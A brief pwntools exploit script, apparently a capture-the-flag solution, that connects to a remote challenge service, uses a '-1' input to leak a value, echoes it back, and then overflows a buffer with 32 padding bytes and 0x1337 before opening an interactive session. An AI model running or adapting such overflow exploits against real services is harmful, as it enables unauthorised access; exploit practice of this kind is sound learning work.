from pwn import *

# p = process('./example01')
p = remote('invades.space', 4001)

print(p.recvuntil('>'))

p.sendline(b"-1")
leak = p.recvuntil(b'>').split()[2]


p.sendline(leak)

print(p.recvuntil(b'>'))

p.sendline(b'A' * 32 + p32(0x1337))

p.interactive()
